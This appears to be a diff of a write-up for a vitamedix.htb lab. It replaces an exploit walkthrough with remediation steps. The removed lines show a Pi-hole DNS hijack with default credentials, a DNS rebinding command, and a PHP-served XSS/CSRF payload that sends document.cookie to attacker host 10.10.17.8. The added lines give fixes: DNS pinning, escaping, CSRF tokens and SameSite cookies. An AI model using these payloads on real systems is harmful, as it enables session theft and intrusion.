@@ -1,192 +1,200 @@
-### Prerequisites
+The chain relies on four weak points. Patch all of them; removing only one may still leave another path open.
 
-- Attacker machine IP: 10.10.17.8
-    
-      
-    
-- Pi-hole admin access already obtained via password `pihole`
-    
-      
-    
-- A valid user session on www.vitamedix.htb to submit a document URL
-    
-      
-    
+---
 
-### Step 1 — Hijack DNS resolution in Pi-hole
+## 1. Pi-hole default credentials
 
-1. Log in to Pi-hole at `[http://dns.vitamedix.htb:8006/admin/login.php](http://dns.vitamedix.htb:8006/admin/login.php)` with password `pihole`.
-    
-      
-    
-2. Navigate to Settings → DNS:
-    
-      
-    
-    Plaintext
-    
-    ```
-    http://dns.vitamedix.htb:8006/admin/settings.php?tab=dns
-    ```
-    
-3. Under Upstream DNS Servers → Custom 1 (IPv4), enter the attacker IP:
-    
-      
-    
-    Plaintext
-    
-    ```
-    10.10.17.8
-    ```
-    
-4. Remove or disable all other upstream DNS servers.
-    
-      
-    
-5. Click Save.
-    
-      
-    
+Change the WEBPASSWORD in DNS-Server-master/dns-server/docker-compose.yml to a strong, randomly generated secret injected at deploy time, and do not expose the admin UI publicly.
 
-From this point, all DNS queries routed through Pi-hole will be answered by the attacker machine, allowing controlled resolution of www.vitamedix.htb.
-
-  
-
-### Step 2 — Start the DNS rebinder
-
-On the attacker machine, run:
-
-  
-
-Bash
-
-```
-sudo python3 dnsrebinder.py \
-  --domain www.vitamedix.htb \
-  --rebind 10.10.17.8 \
-  --ip 1.1.1.1 \
-  --counter 1 \
-  --tcp --udp
+```yaml
+  environment:
+    WEBPASSWORD: ${PIHOLE_PASSWORD}
 ```
 
-**Behavior:**
+---
 
-  
+## 2. Pin DNS resolution for bot / PDF fetches
 
-- The first DNS query for www.vitamedix.htb resolves to 1.1.1.1 (passes the application’s URL validation).
-    
-      
-    
-- Every subsequent query resolves to 10.10.17.8 (the attacker machine).
-    
-      
-    
+The bot in /api/documentSubmit currently passes the user URL straight to bot.checkMessage(url) with no IP pinning. Reuse the same pinning logic for both the PDF helper and the document-review bot.
 
-### Step 3 — Prepare attacker servers
+**src/helpers/URLHelper.js — resolve, pin, and validate**
 
-#### PHP server on port 4444
+```javascript
+  const dns = require('dns');
+  const url = require('url');
+  const { promisify } = require('util');
+  const dnsLookup = promisify(dns.lookup);
 
-Create `redirect.php` in the web root:
+  const BLACKLIST = ['127.0.0.1', '::1', '::ffff:127.0.0.1', '0.0.0.0'];
 
-  
+  async function resolveAndPin(targetUrl) {
+      const parsed = new URL(targetUrl);
 
-PHP
+      if (!['http:', 'https:'].includes(parsed.protocol)) {
+          throw new Error('Invalid protocol');
+      }
 
-```
-<?php
-// Serve the payload that runs inside the bot's browser
-header('Content-Type: text/html');
-$xss = '<img src=x onerror=\"fetch(\'http://www.vitamedix.htb/api/settings\',{' .
-       'method:\'POST\',' .
-       'headers:{\'Content-Type\':\'application/json\'},' .
-       'body:JSON.stringify({full_name:\\\'<img src=x onerror=fetch(`http://10.10.17.8:4445/?c=`+document.cookie)>\',address:\\\'x\\\'})' .
-       '}).then(()=>location.href=\\\'http://www.vitamedix.htb/settings\\\')\">';
-echo $xss;
-?>
-```
+      // Resolve once and pin the IP
+      const { address } = await dnsLookup(parsed.hostname);
 
-Start the PHP server:
+      if (BLACKLIST.includes(address)) {
+          throw new Error('URL not allowed');
+      }
 
-  
+      // Rebuild URL using the pinned IP so no second DNS lookup happens
+      const pinnedUrl = `${parsed.protocol}//${address}${parsed.port ? ':' + parsed.port : ''}${parsed.pathname}${parsed.search}`;
 
-Bash
+      return {
+          url: pinnedUrl,
+          headers: { Host: parsed.hostname },
+          originalHostname: parsed.hostname
+      };
+  }
 
-```
-php -S 0.0.0.0:4444
+  module.exports = { resolveAndPin };
 ```
 
-#### Cookie listener on port 4445
+**src/helpers/PDFHelper.js — use the pinned URL**
 
-Start a Python listener:
+```javascript
+  const fs = require('fs');
+  const axios = require('axios');
+  const html_to_pdf = require('html-pdf-node');
+  const { resolveAndPin } = require('./URLHelper');
 
-  
+  async function generatePDFFromURL(targetUrl) {
+      const { url, headers } = await resolveAndPin(targetUrl);
 
-Bash
+      const response = await axios.get(url, {
+          headers,
+          timeout: 5000,
+          maxRedirects: 0
+      });
 
+      const htmlContent = response.data;
+      const file = { content: htmlContent };
+
+      const pdfBuffer = await html_to_pdf.generatePdf(file, { format: 'Letter' });
+      fs.writeFileSync('/tmp/result.pdf', pdfBuffer);
+
+      return true;
+  }
+
+  module.exports = { generatePDFFromURL };
 ```
-python3 -m http.server 4445
+
+**src/routes/index.js — validate document URLs before the bot visits them**
+
+```javascript
+  const { resolveAndPin } = require('../helpers/URLHelper');
+
+  router.post('/api/documentSubmit', [AuthMiddleware, JOImiddleware(schemas.url)], async (req, res) => {
+      const { url } = req.body;
+
+      try {
+          await resolveAndPin(url);   // rejects loopback / invalid URLs
+      } catch (e) {
+          return res.status(400).send(response('URL not allowed!'));
+      }
+
+      await db.addDocument(req.user.username, url);
+      bot.checkMessage(url);
+
+      return res.send(response('Document submitted!'));
+  });
 ```
 
-### Step 4 — Submit the malicious document URL
+Also sandbox the bot. The bot should run in a separate cookie jar / browser profile with no admin session, so even if it loads attacker content it cannot modify admin settings.
 
-1. Log in to `[http://www.vitamedix.htb](http://www.vitamedix.htb)`.
-    
-      
-    
-2. Go to the dashboard and open the Submit documents dialog.
-    
-      
-    
-3. Enter the URL:
-    
-      
-    
-    Plaintext
-    
-    ```
-    http://www.vitamedix.htb:4444/redirect.php
-    ```
-    
-4. Click Submit.
-    
-      
-    
+---
 
-The application validates the URL: `URLHelper.validate` resolves www.vitamedix.htb to 1.1.1.1, which is not blacklisted, so the URL is accepted. The internal bot then visits the same URL.
+## 3. Fix stored XSS in profile rendering
 
-  
+Remove the | safe filter everywhere user.full_name is rendered. Nunjucks autoescape: true will then encode the value safely.
 
-By that time, DNS has rebound to 10.10.17.8, so the bot loads `redirect.php` from the attacker server.
+**src/views/dashboard.html**
 
-  
+```html
+  <!-- before -->
+  <option value="{{user.full_name}}">{{ user.full_name | safe }}</option>
 
-### Step 5 — Payload execution in the bot’s browser
+  <!-- after -->
+  <option value="{{user.full_name}}">{{ user.full_name }}</option>
+```
 
-The bot loads `redirect.php`, which executes JavaScript in the bot’s authenticated browser context:
+**src/views/settings.html**
 
-  
+```html
+  <!-- before -->
+  <option value="{{ user.full_name | safe }}">{{ user.full_name | safe }}</option>
+  <input value="{{ user.full_name }}" ...>
 
-1. The script sends a POST request to `[http://www.vitamedix.htb/api/settings](http://www.vitamedix.htb/api/settings)` with the body:
-    
-      
-    
-    JSON
-    
-    ```
-    {
-      "full_name": "<img src=x onerror=fetch('http://10.10.17.8:4445/?c='+document.cookie)>",
-      "address": "x"
-    }
-    ```
-    
-    Because the session cookie is scoped to www.vitamedix.htb and lacks SameSite protection, the browser sends the cookie with this cross-origin request. The settings update succeeds.
-    
-      
-    
-2. After the update, the script redirects the bot to:
-    
-    Plaintext
-    
-    ```
-    http://www.vitamedix.htb/settings
-    ```
+  <!-- after -->
+  <option value="{{ user.full_name }}">{{ user.full_name }}</option>
+  <input value="{{ user.full_name }}" ...>
+```
+
+**src/views/pdfgen.html**
+
+```html
+  <!-- before -->
+  <option value="{{ user.full_name | safe }}">{{ user.full_name | safe }}</option>
+
+  <!-- after -->
+  <option value="{{ user.full_name }}">{{ user.full_name }}</option>
+```
+
+---
+
+## 4. Add CSRF protection to state-changing endpoints
+
+Set the session cookie with SameSite=Strict, HttpOnly, and Secure, and validate an anti-CSRF token on POST /api/settings.
+
+**src/routes/index.js — secure cookie at login**
+
+```javascript
+  let token = JWTHelper.sign({ username: username, role: data.role });
+  res.cookie('session', token, {
+      maxAge: 3600000,
+      httpOnly: true,
+      sameSite: 'strict',
+      secure: true
+  });
+```
+
+**CSRF token generation and validation**
+
+Add a middleware that compares a token from the request body/header against the value stored server-side for the session:
+
+```javascript
+  function csrfProtection(req, res, next) {
+      const submitted = req.headers['x-csrf-token'] || req.body._csrf;
+      if (!submitted || submitted !== req.user.csrfToken) {
+          return res.status(403).send({ message: 'Invalid CSRF token' });
+      }
+      next();
+  }
+```
+
+Include the token in the JWT payload when signing, and require it on POST /api/settings:
+
+```javascript
+  router.post('/api/settings', [AuthMiddleware, csrfProtection], async (req, res) => {
+      const { full_name, address } = req.body;
+      // ...
+  });
+```
+
+---
+
+## 5. Harden body-parser
+
+Remove the type: () => true override so JSON endpoints only accept application/json:
+
+```javascript
+  app.use(bodyParser.json());
+```
+
+This prevents simple cross-origin text/plain fetch CSRF against JSON endpoints.
+
+---
